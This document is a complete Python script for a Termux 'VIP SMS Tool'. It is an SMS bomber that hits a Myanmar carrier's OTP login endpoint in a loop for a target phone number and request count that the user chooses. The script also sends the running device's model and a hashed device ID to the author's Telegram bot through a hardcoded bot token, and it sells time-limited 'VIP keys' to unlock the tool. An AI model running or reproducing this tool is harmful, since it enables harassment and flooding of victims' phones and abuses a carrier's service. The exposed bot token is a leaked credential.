#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json

# --- CONFIGURATION ---
BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
# User's chat ID can be hardcoded here if getUpdates fails. 
# For now, I'll keep the dynamic one but make it more robust.
KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def get_model():
    try:
        # Termux မှာ ဖုန်း Model ကို ယူရန်
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    info = platform.processor() + platform.node() + platform.machine()
    return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]

def loading_bar(iteration, total, prefix='Sending', length=30):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    sys.stdout.write(f'\r{prefix}... [{bar}] {percent}% ')
    sys.stdout.flush()
    if iteration == total:
        print()

def banner():
    clear_screen()
    print("\033[1;32m")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print("\n    >>> ShineKoko VIP SMS Tool <<<")
    print("\033[1;37m" + "="*50)
    d_id = get_id()
    model = get_model()
    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
    print(f"[*] Model     : {model}")
    
    # Display Profile Summary if key is active
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        key = saved["key"]
        days = int(key.split("-D")[-1])
        print(f"[*] VIP Status: \033[1;32mActive ({days} Days)\033[1;37m")
    else:
        print(f"[*] VIP Status: \033[1;31mInactive\033[1;37m")
        
    print("="*50 + "\033[0m")
    return d_id, model

def send_tg(d_id, model):
    """
    Sends notification to the Telegram bot.
    It tries to find the chat_id from getUpdates.
    """
    try:
        # First, try to get the chat ID from the latest message to the bot
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url, timeout=10).json()
        
        chat_id = None
        if resp.get("result"):
            # Look for the last chat ID that sent a message
            for update in reversed(resp["result"]):
                if "message" in update:
                    chat_id = update["message"]["chat"]["id"]
                    break
        
        if chat_id:
            msg = (f"🚨 *New VIP Request* 🚨\n\n"
                   f"📱 *Model:* {model}\n"
                   f"🆔 *ID:* `{d_id}`\n\n"
                   f"🔑 *Available Keys:* \n"
                   f"• 1D: `SHINE-{d_id}-D1`\n"
                   f"• 3D: `SHINE-{d_id}-D3`\n"
                   f"• 5D: `SHINE-{d_id}-D5`\n"
                   f"• 7D: `SHINE-{d_id}-D7`\n"
                   f"• 15D: `SHINE-{d_id}-D15`\n"
                   f"• 30D: `SHINE-{d_id}-D30` ")
            
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                data={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"},
                timeout=10
            )
    except Exception as e:
        # We don't want to crash the script if TG fails, but we can log for debugging if needed
        pass

def save_key(key):
    data = {
        "key": key,
        "activated_at": time.time()
    }
    try:
        with open(KEY_FILE, "w") as f:
            json.dump(data, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    if not (key.startswith("SHINE-") and d_id in key):
        return False
    try:
        days_str = key.split("-D")[-1]
        days = int(days_str)
        expiry_time = activated_at + (days * 24 * 60 * 60)
        if time.time() < expiry_time:
            return True
    except: pass
    return False

def auth(d_id):
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        print("\033[1;32m[+] VIP Session Restored!\033[0m")
        time.sleep(1)
        return True
        
    while True:
        banner()
        print("\033[1;33m[!] Notification sent to Admin. Please wait for your key.\033[0m")
        key = input("\n[?] Enter VIP Key: ").strip()
        if key.startswith("SHINE-") and d_id in key:
            save_key(key)
            print("\033[1;32m[+] Key Accepted!\033[0m")
            time.sleep(1)
            return True
        print("\033[1;31m[!] Invalid Key! Contact Admin.\033[0m")
        time.sleep(2)

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n[*] Starting SMS Bomber for {p}...")
    loading_bar(0, c)
    for i in range(c):
        try:
            requests.get(url.format(p), timeout=5)
        except: pass
        loading_bar(i + 1, c)
        time.sleep(0.05)
    print("\n\033[1;32m[+] Process Finished Successfully!\033[0m")
    input("\nPress Enter to return to menu...")

def show_profile(d_id):
    saved = get_saved_key()
    clear_screen()
    print("\033[1;32m")
    print("  ╔════════════════════════════════════╗")
    print("  ║         USER VIP PROFILE           ║")
    print("  ╚════════════════════════════════════╝\033[0m")
    
    if is_key_valid(saved, d_id):
        key = saved["key"]
        activated_at = saved["activated_at"]
        days = int(key.split("-D")[-1])
        expiry_time = activated_at + (days * 24 * 60 * 60)
        remaining = expiry_time - time.time()
        
        rem_days = int(remaining // (24 * 60 * 60))
        rem_hours = int((remaining % (24 * 60 * 60)) // 3600)
        rem_mins = int((remaining % 3600) // 60)
        
        print(f"  \033[1;37m[•] Device ID  : \033[1;36m{d_id}\033[0m")
        print(f"  \033[1;37m[•] VIP Key    : \033[1;36m{key}\033[0m")
        print(f"  \033[1;37m[•] Status     : \033[1;32mActive\033[0m")
        print(f"  \033[1;37m[•] Balance    : \033[1;33m{rem_days} Days Remaining\033[0m")
        print(f"  \033[1;37m[•] Expires In : \033[1;35m{rem_days}D {rem_hours}H {rem_mins}M\033[0m")
    else:
        print(f"  \033[1;37m[•] Device ID  : \033[1;36m{d_id}\033[0m")
        print(f"  \033[1;31m[!] No active VIP key found.\033[0m")
    
    print("\033[1;32m  ══════════════════════════════════════\033[0m")
    input("\nPress Enter to return...")

def main_menu(d_id, model):
    while True:
        banner()
        print(" [1] SMS Tool (Start Bombing)")
        print(" [2] My Profile (Account Info)")
        print(" [0] Exit")
        
        choice = input("\n[?] Select Option: ").strip()
        
        if choice == '1':
            while True:
                banner()
                p = input("\n[?] Enter Target Phone (or 'b' to back): ")
                if p.lower() == 'b': break
                if not p.isdigit() or len(p) < 7:
                    print("\033[1;31m[!] Invalid Phone Number!\033[0m")
                    time.sleep(1)
                    continue
                try:
                    c = int(input("[?] Enter Request Count: "))
                    send_otp(p, c)
                except ValueError:
                    print("\033[1;31m[!] Invalid count.\033[0m")
                    time.sleep(1)
        elif choice == '2':
            show_profile(d_id)
        elif choice == '0':
            print("\n\033[1;33m[!] Exiting... Thank you for using ShineKoko VIP!\033[0m")
            sys.exit()
        else:
            print("\033[1;31m[!] Invalid Choice\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    try:
        # Initial clear for clean start
        clear_screen()
        d_id = get_id()
        model = get_model()
        
        # SEND NOTIFICATION TO TELEGRAM
        # This will send the Device ID and Model to the bot owner
        send_tg(d_id, model)
        
        if auth(d_id):
            main_menu(d_id, model)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting...")
    except Exception as e:
        print(f"\n[!] Critical Error: {e}")
